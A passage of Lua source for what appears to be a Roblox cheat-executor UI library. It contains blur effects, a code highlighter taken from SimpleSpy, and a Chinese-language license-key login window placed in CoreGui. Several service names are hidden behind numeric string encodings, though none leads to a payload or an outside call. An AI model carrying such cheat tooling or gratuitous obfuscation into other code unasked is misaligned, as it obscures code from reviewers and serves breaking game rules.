		SurfaceGui.ZIndexBehavior = Enum.ZIndexBehavior.Global;

		DepthOfField.Name = GuiSystem:Hash();
		Part.Name = GuiSystem:Hash();
		SurfaceGui.Name = GuiSystem:Hash();

		local C4 = {
			Update = nil,
			Collection = SurfaceGui,
			Enabled = true,
			Instances = {
				BlockMesh = BlockMesh,
				Part = Part,
				DepthOfField = DepthOfField,
				SurfaceGui = SurfaceGui,
			},
			Signal = nil
		};
		local Update = function()
			local _,updatec = pcall(function()
				local userSettings = UserSettings():GetService("UserGameSettings")
				local qualityLevel = userSettings.SavedQualityLevel.Value

				if qualityLevel < 8 then
					Twen:Create(Part,TweenInfo.new(1,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{
						Transparency = 1;
					}):Play()
				else
					Twen:Create(Part,TweenInfo.new(1,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{
						Transparency = 0.8;
					}):Play()
				end;
			end)

			local corner0 = frame.AbsolutePosition;
			local corner1 = corner0 + frame.AbsoluteSize;

			local ray0 = CurrentCamera.ScreenPointToRay(CurrentCamera,corner0.X, corner0.Y, 1);
			local ray1 = CurrentCamera.ScreenPointToRay(CurrentCamera,corner1.X, corner1.Y, 1);

			local planeOrigin = CurrentCamera.CFrame.Position + CurrentCamera.CFrame.LookVector * (0.05 - CurrentCamera.NearPlaneZ);

			local planeNormal = CurrentCamera.CFrame.LookVector;

			local pos0 = Hiter(planeOrigin, planeNormal, ray0.Origin, ray0.Direction);
			local pos1 = Hiter(planeOrigin, planeNormal, ray1.Origin, ray1.Direction);

			pos0 = CurrentCamera.CFrame:PointToObjectSpace(pos0);
			pos1 = CurrentCamera.CFrame:PointToObjectSpace(pos1);

			local size   = pos1 - pos0;
			local center = (pos0 + pos1) / 2;

			BlockMesh.Offset = center
			BlockMesh.Scale  = size / 0.0101;
			Part.CFrame = CurrentCamera.CFrame;
		end
		C4.Update = Update;
		C4.Signal = RunService.RenderStepped:Connect(Update);
		pcall(function()
			C4.Signal2 = CurrentCamera:GetPropertyChangedSignal('CFrame'):Connect(function()
				Part.CFrame = CurrentCamera.CFrame;
			end);
		end)
		C4.Destroy = function()
			C4.Signal:Disconnect();
			C4.Signal2:Disconnect();
			C4.Update = function()
			end;
			Twen:Create(Part,TweenInfo.new(1),{
				Transparency = 1
			}):Play();
			DepthOfField:Destroy();
			Part:Destroy()
		end;
		return C4;
	end;
	return GuiSystem;
end;
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Library.UIBlur = (_C and Source) or LoadAcrylic();
Library.UserInputService = game:GetService('UserInputService');
Library.PerformanceMode = false;
Library.CodeColors = {};
Library.TabButtonHeight = 30;
Library.ItemHeight = 35;

local DefaultStyle = function()
	Library.CodeColors.backgroundColor = Color3.fromRGB(40, 44, 52)
	Library.CodeColors.operatorColor = Color3.fromRGB(187, 85, 255)
	Library.CodeColors.functionColor = Color3.fromRGB(97, 175, 239)
	Library.CodeColors.stringColor = Color3.fromRGB(152, 195, 121)
	Library.CodeColors.numberColor = Color3.fromRGB(209, 154, 102)
	Library.CodeColors.booleanColor = Color3.fromRGB(209, 154, 102)
	Library.CodeColors.objectColor = Color3.fromRGB(229, 192, 123)
	Library.CodeColors.defaultColor = Color3.fromRGB(224, 108, 117)
	Library.CodeColors.commentColor = Color3.fromRGB(148, 148, 148)
	Library.CodeColors.lineNumberColor = Color3.fromRGB(148, 148, 148)
	Library.CodeColors.genericColor = Color3.fromRGB(240, 240, 240)
end;

Library.CodeStyle = {};

function Library.CodeStyle:Default()
	DefaultStyle()
end;

DefaultStyle()

function Library.CodeStyle:RobloxStudio()
	Library.CodeColors.backgroundColor = Color3.fromRGB(37, 37, 37)
	Library.CodeColors.operatorColor = Color3.fromRGB(204, 204, 204)
	Library.CodeColors.functionColor = Color3.fromRGB(248, 109, 124)
	Library.CodeColors.stringColor = Color3.fromRGB(173, 241, 149)
	Library.CodeColors.numberColor = Color3.fromRGB(255, 198, 0)
	Library.CodeColors.booleanColor = Color3.fromRGB(255, 198, 0)
	Library.CodeColors.objectColor = Color3.fromRGB(204, 204, 204)
	Library.CodeColors.defaultColor = Color3.fromRGB(204, 204, 204)
	Library.CodeColors.commentColor = Color3.fromRGB(102, 102, 102)
	Library.CodeColors.lineNumberColor = Color3.fromRGB(255, 255, 255)
	Library.CodeColors.genericColor = Color3.fromRGB(240, 240, 240)
end;

function Library.CodeStyle:DarkLua()
	Library.CodeColors.backgroundColor = Color3.fromRGB(37, 37, 37)
	Library.CodeColors.operatorColor = Color3.fromRGB(204, 204, 204)
	Library.CodeColors.functionColor = Color3.fromRGB(248, 0, 37)
	Library.CodeColors.stringColor = Color3.fromRGB(0, 241, 20)
	Library.CodeColors.numberColor = Color3.fromRGB(255, 198, 0)
	Library.CodeColors.booleanColor = Color3.fromRGB(255, 198, 0)
	Library.CodeColors.objectColor = Color3.fromRGB(204, 204, 204)
	Library.CodeColors.defaultColor = Color3.fromRGB(204, 204, 204)
	Library.CodeColors.commentColor = Color3.fromRGB(102, 102, 102)
	Library.CodeColors.lineNumberColor = Color3.fromRGB(255, 255, 255)
	Library.CodeColors.genericColor = Color3.fromRGB(240, 240, 240)
end;

Library.TextEffect = {};

function Library.TextEffect:AddColor(text : string,color : Color3)
	return `<font color="rgb({math.round(color.R * 255)},{tostring(math.round(color.G * 255))},{math.round(color.B * 255)})">{text}</font>`
end;

function Library.TextEffect:Transparency(text : string,value : number)
	return `<font transparency="{value}">{text}</font>`
end;

local offLimits = {}

-- Code from https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/highlight.lua --

function render(source)
	tableContents = {}
	offLimits = {}
	lines = {}

	string.gsub(source,'.',function(a)
		table.insert(tableContents, {
			Char = a,
			Color = Library.CodeColors.defaultColor,
		}) 
	end)

	local function autoEscape(s)
		for i = 0, #s do
			local char = string.sub(s, i, i)
			if char == "<" then
				s = string.format("%s%s%s", string.sub(s, 0, i - 1), "&lt;", string.sub(s, i + 1, -1))
				i += 3
			elseif char == ">" then
				s = string.format("%s%s%s", string.sub(s, 0, i - 1), "&gt;", string.sub(s, i + 1, -1))
				i += 3
			elseif char == '"' then
				s = string.format("%s%s%s", string.sub(s, 0, i - 1), "&quot;", string.sub(s, i + 1, -1))
				i += 5
			elseif char == "'" then
				s = string.format("%s%s%s", string.sub(s, 0, i - 1), "&apos;", string.sub(s, i + 1, -1))
				i += 5
			elseif char == "&" then
				s = string.format("%s%s%s", string.sub(s, 0, i - 1), "&amp;", string.sub(s, i + 1, -1))
				i += 4
			end
		end
		-- s:gsub("<", "&lt;")
		-- s:gsub(">", "&gt;")
		-- s:gsub('"', "&quot;")
		-- s:gsub("'", "&apos;")
		-- s:gsub("&", "&amp;")
		return s
	end

	local function gfind(str, pattern)
		return coroutine.wrap(function()
			local start = 0
			while true do
				local findStart, findEnd = str:find(pattern, start)
				if findStart and findEnd ~= #str then
					start = findEnd + 1
					coroutine.yield(findStart, findEnd)
				else
					return
				end
			end
		end)
	end

	local function isOffLimits(index)
		for _, v in next, offLimits do
			if index >= v[1] and index <= v[2] then
				return true
			end
		end
		return false
	end

	local function highlightPattern(patternArray, color)
		local step = 1
		for _, pattern in next, patternArray do
			for findStart, findEnd in gfind(source, pattern) do
				if step % 1000 == 0 then
					task.wait()
				end
				step += 1
				if not isOffLimits(findStart) and not isOffLimits(findEnd) then
					for i = findStart, findEnd do
						if tableContents[i] then
							tableContents[i].Color = color
						end
					end
				end
			end
		end
	end

	local function renderStrings()
		local stringType
		local stringEndType
		local ignoreBackslashes
		local stringStart
		local stringEnd
		local offLimitsIndex
		local skip = false

		for i, char in next, tableContents do
			if stringType then
				char.Color = Library.CodeColors.stringColor
				local possibleString = ""
				for k = stringStart, i do
					possibleString = possibleString .. tableContents[k].Char
				end
				if char.Char:match(stringEndType) and not not ignoreBackslashes or (possibleString:match("(\\*)" .. stringEndType .. "$") and #possibleString:match("(\\*)" .. stringEndType .. "$") % 2 == 0) then
					skip = true
					stringType = nil
					stringEndType = nil
					ignoreBackslashes = nil
					stringEnd = i
					offLimits[offLimitsIndex][2] = stringEnd
				end
			end
			if not skip then
				for _, v in next, strings do
					if char.Char:match(v[1]) and not isOffLimits(i) then
						stringType = v[1]
						stringEndType = v[2]
						ignoreBackslashes = v[3]
						char.Color = Library.CodeColors.stringColor
						stringStart = i
						offLimitsIndex = #offLimits + 1
						offLimits[offLimitsIndex] = {stringStart, math.huge}
					end
				end
			end
			skip = false
		end
	end

	local function renderComments()
		local step = 1
		for _, pattern in next, comments do
			for commentStart, commentEnd in gfind(source, pattern) do
				if step % 1000 == 0 then
					task.wait()
				end
				step += 1
				if not isOffLimits(commentStart) then
					for i = commentStart, commentEnd do
						table.insert(offLimits, {commentStart, commentEnd})
						if tableContents[i] then
							tableContents[i].Color = Library.CodeColors.commentColor
						end
					end
				end
			end
		end
	end

	highlightPattern(functions, Library.CodeColors.functionColor)
	highlightPattern(numbers, Library.CodeColors.numberColor)
	highlightPattern(operators, Library.CodeColors.operatorColor)
	highlightPattern(objects, Library.CodeColors.objectColor)
	highlightPattern(booleans, Library.CodeColors.booleanColor)
	highlightPattern(other, Library.CodeColors.genericColor)
	renderComments()
	renderStrings()

	local lastColor
	local stack = {};
	local lineStr = ""
	local rawStr = ""
	local largestX = 0
	local line = 1

	for i = 1, #tableContents + 1 do
		local char = tableContents[i]
		if i == #tableContents + 1 or char.Char == "\n" then
			lineStr = lineStr .. (lastColor and "</font>" or "")

			table.insert(stack,lineStr)

			lineStr = ""
			rawStr = ""
			lastColor = nil
			line += 1

			if line % 5 == 0 then
				task.wait()
			end
		elseif char.Char == " " then
			lineStr = lineStr .. char.Char
			rawStr = rawStr .. char.Char
		elseif char.Char == "\t" then
			lineStr = lineStr .. string.rep(" ", 4)
			rawStr = rawStr .. char.Char
		else
			if char.Color == lastColor then
				lineStr = lineStr .. autoEscape(char.Char)
			else

				lineStr = lineStr .. string.format('%s<font color="rgb(%d,%d,%d)">', lastColor and "</font>" or "", char.Color.R * 255, char.Color.G * 255, char.Color.B * 255)
				lineStr = lineStr .. autoEscape(char.Char)
				lastColor = char.Color
			end
			rawStr = rawStr .. char.Char
		end
	end

	return stack
end

--------------------------------------------------------------------------------------------------------

local tableContents = {};
local offLimits = {}
local lines = {}

function Library:GetTextSize(text,fontSize,font,custom_w)
	return TextService:GetTextSize(text,fontSize,font,Vector2.new(custom_w or math.huge,math.huge))	
end;

function Library:HightlightSource(source)

	return table.concat(render(source),'\n')
end;

function Library:InputButton(Frame :Frame)
	local Button = Instance.new("TextButton")

	Button.Name = "Button"
	Button.Parent = Frame
	Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Button.BackgroundTransparency = 1.000
	Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Button.BorderSizePixel = 0
	Button.Size = UDim2.new(1, 0, 1, 0)
	Button.ZIndex = 12
	Button.Font = Enum.Font.SourceSans
	Button.TextColor3 = Color3.fromRGB(0, 0, 0)
	Button.TextSize = 14.000
	Button.TextTransparency = 1.000	

	return Button;
end;

function Library:MakeDrop(Frame :Frame , Hover :UIStroke, Color :Color3)
	local CloneColor = Hover.Color;

	Frame.MouseEnter:Connect(function()
		Library.TweenService:Create(Hover , TweenInfo.new(0.1), {
			Color = Color,
		}):Play();
	end);

	Frame.MouseLeave:Connect(function()
		Library.TweenService:Create(Hover , TweenInfo.new(0.1), {
			Color = CloneColor,
		}):Play();
	end)
end;

function Library:DelayTween(belay :number , Frame: GuiObject , Info: TweenInfo, Prop : {any})
	local Instance = Library.TweenService.Create(Library.TweenService , Frame , Info ,Prop);
	return task.delay(belay ,Instance.Play,Instance);
end;

function Library:Tween(Frame :GuiObject , TweenInfo: TweenInfo , Properties : {})
	if Library.PerformanceMode then
		table.foreach(Properties,function(name,value)
			Frame[name] = value;
		end)

		return;
	end;

	local Instance = Library.TweenService:Create(Frame,TweenInfo,Properties);
	Instance:Play();
	return Instance
end;
    local blurEffect = Instance.new((function()
        local a={895,1441,1558,1519,934,1363,1363,1350,1324,1545};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)())
    local TweenService = game:GetService((function()
        local a={1129,1584,1350,1350,1467,1116,1350,1519,1571,1402,1324,1350};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)())
    blurEffect.Parent = game.Lighting
    blurEffect.Size = 60

    local blurTweenInfo = TweenInfo.new(4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local blurTween = TweenService:Create(blurEffect, blurTweenInfo, {Size = 0})
    
    blurTween:Play()

    coroutine.resume(coroutine.create(function()
        wait(2.5)
        blurEffect:Destroy()
    end))
------------------------------//    UI.标题设置    //-------------------------------------------------------------------------------------
function Library:Windowxgo(setup)
	setup = setup or {};

	setup.Title = setup.Title or "Window";
	setup.Keybind = setup.Keybind or Enum.KeyCode.LeftControl;
	setup.Size = setup.Size or Library.SizeLibrary.Default;
	setup.KeySystem = setup.KeySystem or false;
	setup.Logo = setup.Logo or "rbxassetid://7733920644";
	setup.ToggleMethod = setup.ToggleMethod or "Application";
	
	if setup.KeySystem then
		setup.KeySystemInfo = setup.KeySystemInfo or {};

		setup.KeySystemInfo.Title = setup.KeySystemInfo.Title or "Key System";
		setup.KeySystemInfo.OnGetKey = setup.KeySystemInfo.OnGetKey or function() end;
		setup.KeySystemInfo.OnLogin = setup.KeySystemInfo.OnLogin or function() wait( 0.1) return true end;

	end
	
    local ScreenGui = Instance.new("ScreenGui")
    local MainFrame = Instance.new("Frame")
    local BackgroundImage = Instance.new("ImageLabel")
	local DropShadow = Instance.new("ImageLabel")
	local Ico = Instance.new("ImageLabel")

    local images = {
        "rbxassetid://123698784885744",
        "rbxassetid://88666635012556",
	    "rbxassetid://102797584513959",
	    "rbxassetid://96996396016819",
        "rbxassetid://128885038925647",
	    "rbxassetid://86451637909512",
        "rbxassetid://109948306798374",
        "rbxassetid://92630758837243",
    }
    local currentImageIndex = 1

    local function changeImage()
        if images[currentImageIndex] then
            BackgroundImage.Image = images[currentImageIndex]
            BackgroundImage.ImageTransparency = 0
        else
            warn("\73\110\118\97\108\105\100\32\105\109\97\103\101\32\73\68\32\97\116\32\105\110\100\101\120\32" .. currentImageIndex)
        end
    end

    ScreenGui.Parent = game.CoreGui
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

    MainFrame.Name = "MainFrame"
    MainFrame.Parent = ScreenGui
    MainFrame.Active = true
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    MainFrame.BackgroundTransparency = 0.250
    MainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
    MainFrame.BorderSizePixel = 0
    MainFrame.ClipsDescendants = true
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    MainFrame.Size = UDim2.fromScale(0, 0)

    BackgroundImage.Parent = MainFrame
    BackgroundImage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    BackgroundImage.BackgroundTransparency = 1
    BackgroundImage.Size = UDim2.new(1, 0, 1, 1)
    BackgroundImage.ImageColor3 = Color3.fromRGB(255, 255, 255)
    BackgroundImage.ScaleType = Enum.ScaleType.Stretch

    local interval = 10
    local timeSinceLastChange = 0
--  时间自己设置，自己乘以自己设置的时间就行了 [ 3/10 = 2倍速  2/10 = 1倍速 <5正常率10中等倍率15超快倍率等..> ]
    game:GetService("RunService").Heartbeat:Connect(function()
        timeSinceLastChange = timeSinceLastChange + 1
        if timeSinceLastChange >= interval * 10 then
            changeImage()
            timeSinceLastChange = 0
            currentImageIndex = currentImageIndex + 1
            if currentImageIndex > #images then
                currentImageIndex = 1
            end
        end
    end)
   
	local BlurEle = Library.UIBlur.new(MainFrame,true);

	DropShadow.Name = "DropShadow"
	DropShadow.Parent = MainFrame
	DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	DropShadow.BackgroundTransparency = 1.000
	DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
	DropShadow.Position = UDim2.new(0, -5, 0, -5)
	DropShadow.Rotation = 0.010
	DropShadow.Size = UDim2.new(1, 10, 1, 10)
	DropShadow.ZIndex = -5
	DropShadow.Image = "rbxassetid://297694300"
	DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
	DropShadow.ImageTransparency = 0.500
	DropShadow.ScaleType = Enum.ScaleType.Slice
	DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
	DropShadow.SliceScale = 0.050

	Ico.Name = "Ico"
	Ico.Parent = MainFrame
	Ico.AnchorPoint = Vector2.new(0.5, 0.5)
	Ico.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Ico.BackgroundTransparency = 1.000
	Ico.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Ico.BorderSizePixel = 0
	Ico.Position = UDim2.new(0.5, 0, 0.5, 0)
	Ico.Size = UDim2.new(0.600000024, 0, 0.600000024, 0)
	Ico.SizeConstraint = Enum.SizeConstraint.RelativeYY
	Ico.Image = setup.Logo
	Ico.ImageTransparency = 1.000

	Library:Tween(MainFrame , Library.TweenLibrary.SmallEffect,{Size = Library.SizeLibrary.Loading})
	Library:Tween(Ico , Library.TweenLibrary.SmallEffect,{ImageTransparency = 0.25})

	if setup.KeySystem then
		setup.KeySystemInfo.Enabled = true;
		setup.KeySystemInfo.Finished = Instance.new('BindableEvent');

		task.wait(1)

		task.delay(0.1,function()
			Library:Tween(Ico , Library.TweenLibrary.SmallEffect,{ImageTransparency = 1})
		end)

		Library:Tween(MainFrame , Library.TweenLibrary.WindowChanged,{Size = Library.SizeLibrary.Auth})

		task.wait(1);
------ // 卡密系统设置    ----------------------------------------------------------------------------------------
		local AuthFunction = Instance.new("Frame")
		local Title = Instance.new("TextLabel")
		local TextBox = Instance.new("TextBox")
		local DropShadow = Instance.new("ImageLabel")
		local UIStroke = Instance.new("UIStroke") -- 边框
		local UIStroke_2 = Instance.new("UIStroke")
		local GetButton = Instance.new("Frame")
		local DropShadow_2 = Instance.new("ImageLabel")
		local UIStroke_3 = Instance.new("UIStroke")
		local GTitle = Instance.new("TextLabel")
		local GButton = Instance.new("TextButton")
		local LoginButton = Instance.new("Frame")
		local DropShadow_3 = Instance.new("ImageLabel")
		local UIStroke_4 = Instance.new("UIStroke")
		local LTitle = Instance.new("TextLabel")
		local LButton = Instance.new("TextButton")
        local CloseButton = Instance.new("TextButton")
        
        AuthFunction.Name = "AuthFunction"
		AuthFunction.Parent = MainFrame
		AuthFunction.Active = true
		AuthFunction.AnchorPoint = Vector2.new(0.5, 0.5)
		AuthFunction.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		AuthFunction.BackgroundTransparency = 1.000
		AuthFunction.BorderColor3 = Color3.fromRGB(0, 0, 0)
		AuthFunction.BorderSizePixel = 0
		AuthFunction.Position = UDim2.new(0.5, 0, -1.5, 0)
		AuthFunction.Size = UDim2.new(1, 0, 1, 0)

		Library:Tween(AuthFunction , Library.TweenLibrary.SmallEffect,{Position = UDim2.new(0.5, 0, 0.5, 0)})
          
		Title.Name = "Title"
		Title.Parent = AuthFunction
		Title.AnchorPoint = Vector2.new(0.5, 0.5)
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Title.BorderSizePixel = 0
		Title.Position = UDim2.new(0.5, 0, 0.100000001, 0)
		Title.Size = UDim2.new(0.899999976, 0, 0.100000001, 0)
		Title.Font = Enum.Font.Gotham
		Title.Text = setup.KeySystemInfo.Title
		Title.TextColor3 = Library.Colors.TextColor
		Title.TextScaled = true
		Title.TextSize = 14.000
		Title.TextStrokeColor3 = Library.Colors.TextColor
		Title.TextStrokeTransparency = 0.950
		Title.TextWrapped = true
		Title.RichText = true;

		TextBox.Parent = AuthFunction
		TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
		TextBox.BackgroundColor3 = Library.Colors.Default
		TextBox.BackgroundTransparency = 0.250
		TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextBox.BorderSizePixel = 0
		TextBox.Position = UDim2.new(0.5, 0, 0.349999994, 0)
		TextBox.Size = UDim2.new(0.699999988, 0, 0.125, 0)
		TextBox.ZIndex = 5
		TextBox.ClearTextOnFocus = false
		TextBox.Font = Enum.Font.SourceSans
		TextBox.PlaceholderText = "请输入卡密"
		TextBox.Text = ""
		TextBox.TextColor3 = Library.Colors.TextColor
		TextBox.TextSize = 13.000
		TextBox.TextStrokeColor3 = Library.Colors.TextColor
		TextBox.TextStrokeTransparency = 0.950
		TextBox.TextTransparency = 0.250
		TextBox.TextWrapped = true

		DropShadow.Name = "DropShadow"
		DropShadow.Parent = TextBox
		DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DropShadow.BackgroundTransparency = 1.000
		DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
		DropShadow.Position = UDim2.new(0, -5, 0, -5)
		DropShadow.Size = UDim2.new(1, 10, 1, 10)
		DropShadow.ZIndex = 4
		DropShadow.Image = "rbxassetid://297694300"  --2
		DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
		DropShadow.ImageTransparency = 0.500
		DropShadow.ScaleType = Enum.ScaleType.Slice
		DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
		DropShadow.SliceScale = 0.050

		UIStroke.Transparency = 0.850
		UIStroke.Color = Color3.fromRGB(156, 156, 156)
		UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		UIStroke.Parent = TextBox

		UIStroke_2.Transparency = 0.850
		UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
		UIStroke_2.Parent = AuthFunction

		GetButton.Name = "GetButton"
		GetButton.Parent = AuthFunction
		GetButton.AnchorPoint = Vector2.new(0.5, 0.5)
		GetButton.BackgroundColor3 = Library.Colors.Default
		GetButton.BackgroundTransparency = 0.250
		GetButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
		GetButton.BorderSizePixel = 0
		GetButton.Position = UDim2.new(0.25, 0, 0.649999976, 0)
		GetButton.Size = UDim2.new(0.349999994, 0, 0.185000002, 0)
		GetButton.ZIndex = 5

		DropShadow_2.Name = "DropShadow"
		DropShadow_2.Parent = GetButton
		DropShadow_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DropShadow_2.BackgroundTransparency = 1.000
		DropShadow_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
		DropShadow_2.Position = UDim2.new(0, -5, 0, -5)
		DropShadow_2.Size = UDim2.new(1, 10, 1, 10)
		DropShadow_2.ZIndex = 4
		DropShadow_2.Image = "rbxassetid://297694300"  --3
		DropShadow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
		DropShadow_2.ImageTransparency = 0.500
		DropShadow_2.ScaleType = Enum.ScaleType.Slice
		DropShadow_2.SliceCenter = Rect.new(95, 103, 894, 902)
		DropShadow_2.SliceScale = 0.050

		UIStroke_3.Transparency = 0.850
		UIStroke_3.Color = Color3.fromRGB(156, 156, 156)
		UIStroke_3.Parent = GetButton

		GTitle.Name = "GTitle"
		GTitle.Parent = GetButton
		GTitle.AnchorPoint = Vector2.new(0.5, 0.5)
		GTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		GTitle.BackgroundTransparency = 1.000
		GTitle.BorderColor3 = Color3.fromRGB(0, 0, 0)
		GTitle.BorderSizePixel = 0
		GTitle.Position = UDim2.new(0.5, 0, 0.5, 0)
		GTitle.Size = UDim2.new(0.899999976, 0, 0.449999988, 0)
		GTitle.ZIndex = 6
		GTitle.Font = Enum.Font.Gotham
		GTitle.Text = "链接"
		GTitle.TextColor3 = Library.Colors.TextColor
		GTitle.TextScaled = true
		GTitle.TextSize = 14.000
		GTitle.TextStrokeColor3 = Library.Colors.TextColor
		GTitle.TextStrokeTransparency = 0.950
		GTitle.TextWrapped = true
		
		GButton.Name = "GButton"
		GButton.Parent = GetButton
		GButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		GButton.BackgroundTransparency = 1.000
		GButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
		GButton.BorderSizePixel = 0
		GButton.Size = UDim2.new(1, 0, 1, 0)
		GButton.ZIndex = 15
		GButton.Font = Enum.Font.SourceSans
		GButton.TextColor3 = Color3.fromRGB(0, 0, 0)
		GButton.TextSize = 14.000
		GButton.TextTransparency = 1.000
		
		LoginButton.Name = "LoginButton"
		LoginButton.Parent = AuthFunction
		LoginButton.AnchorPoint = Vector2.new(0.5, 0.5)
		LoginButton.BackgroundColor3 = Library.Colors.Default
		LoginButton.BackgroundTransparency = 0.250
		LoginButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
		LoginButton.BorderSizePixel = 0
		LoginButton.Position = UDim2.new(0.75, 0, 0.649999976, 0)
		LoginButton.Size = UDim2.new(0.349999994, 0, 0.185000002, 0)
		LoginButton.ZIndex = 5

		DropShadow_3.Name = "DropShadow"
		DropShadow_3.Parent = LoginButton
		DropShadow_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DropShadow_3.BackgroundTransparency = 1.000
		DropShadow_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
		DropShadow_3.Position = UDim2.new(0, -5, 0, -5)
		DropShadow_3.Size = UDim2.new(1, 10, 1, 10)
		DropShadow_3.ZIndex = 4
		DropShadow_3.Image = "rbxassetid://297694300"  --4
		DropShadow_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
		DropShadow_3.ImageTransparency = 0.500
		DropShadow_3.ScaleType = Enum.ScaleType.Slice
		DropShadow_3.SliceCenter = Rect.new(95, 103, 894, 902)
		DropShadow_3.SliceScale = 0.050

		UIStroke_4.Transparency = 0.850
		UIStroke_4.Color = Color3.fromRGB(156, 156, 156)
		UIStroke_4.Parent = LoginButton

		LTitle.Name = "LTitle"
		LTitle.Parent = LoginButton
		LTitle.AnchorPoint = Vector2.new(0.5, 0.5)
		LTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		LTitle.BackgroundTransparency = 1.000
		LTitle.BorderColor3 = Color3.fromRGB(0, 0, 0)
		LTitle.BorderSizePixel = 0
		LTitle.Position = UDim2.new(0.5, 0, 0.5, 0)
		LTitle.Size = UDim2.new(0.899999976, 0, 0.449999988, 0)
		LTitle.ZIndex = 6
		LTitle.Font = Enum.Font.Gotham
		LTitle.Text = "确认"
		LTitle.TextColor3 = Library.Colors.TextColor
		LTitle.TextScaled = true
		LTitle.TextSize = 14.000
		LTitle.TextStrokeColor3 = Library.Colors.TextColor
		LTitle.TextStrokeTransparency = 0.950
		LTitle.TextWrapped = true

		LButton.Name = "LButton"
		LButton.Parent = LoginButton
		LButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		LButton.BackgroundTransparency = 1.000
		LButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
		LButton.BorderSizePixel = 0
		LButton.Size = UDim2.new(1, 0, 1, 0)
		LButton.ZIndex = 15
		LButton.Font = Enum.Font.SourceSans
		LButton.Text = "确认"
		LButton.TextColor3 = Color3.fromRGB(0, 0, 0)
		LButton.TextSize = 14.000
		LButton.TextTransparency = 1.000
		
        CloseButton.Name = "CloseButton"
        CloseButton.Parent = AuthFunction
        CloseButton.BackgroundColor3 = Color3.new(0, 0, 0) 
        CloseButton.BackgroundTransparency = 1 
        CloseButton.Size = UDim2.new(0.1, 0, 0.1, 0)
        CloseButton.Position = UDim2.new(0.9, 0, 0, 0)
        CloseButton.Font = Enum.Font.GothamSemibold
        CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        CloseButton.Text = "X"
        CloseButton.TextSize = 14
        CloseButton.MouseButton1Click:Connect(function()
            Library:Tween(MainFrame, Library.TweenLibrary.Normal, {Size = UDim2.fromScale(0,0)})
            task.wait(0.5)
            ScreenGui:Destroy()
        end)
        
        Library:MakeDrop(GetButton , UIStroke_3 , Library.Colors.Hightlight)
		Library:MakeDrop(LoginButton , UIStroke_4 , Library.Colors.Hightlight)
		Library:MakeDrop(TextBox , UIStroke , Library.Colors.Hightlight)
		setup.KeySystemInfo.CodeId = game:GetService('HttpService'):GenerateGUID(false);
        setup.KeySystemInfo.AntiSpam = false;

		LButton.MouseButton1Click:Connect(function()
		    if setup.KeySystemInfo.AntiSpam then return end;
		    setup.KeySystemInfo.AntiSpam = true;
		    
		    if TextBox.Text == "" then
		        TextBox.PlaceholderText = "你没有填入卡密"
		        task.wait(1.5)
		        TextBox.PlaceholderText = "请输入卡密"
		    else
		        local verify = setup.KeySystemInfo.OnLogin(TextBox.Text);
		        if verify then
		            setup.KeySystemInfo.Finished:Fire(setup.KeySystemInfo.CodeId)
		            
		            CloseButton.Visible = false;
		            return TextBox.Text;
		        else
		            task.wait(0.1)
		            TextBox.Text = ""
		            TextBox.PlaceholderText = "你输入的卡密错误"
		            task.wait(1.5)
		            TextBox.PlaceholderText = "请重新输入卡密"
		        end;
		    end;
		    setup.KeySystemInfo.AntiSpam = false;
		end)
	    
		GButton.MouseButton1Click:Connect(setup.KeySystemInfo.OnGetKey)

		function setup:CancelLogin()
			setup.KeySystemInfo.Finished:Fire(setup.KeySystemInfo.CodeId)
		end;

		while true do 
			local this = setup.KeySystemInfo.Finished.Event:Wait();

			if this == setup.KeySystemInfo.CodeId then
				break;
			end;
		end;

		TextBox.TextEditable = false;

		Library:Tween(AuthFunction , Library.TweenLibrary.Normal,{Position = UDim2.new(0.5, 0, 1.5, 0)});

		task.wait(0.5)
	else
		repeat task.wait(1.5) until game:IsLoaded();		
	end;

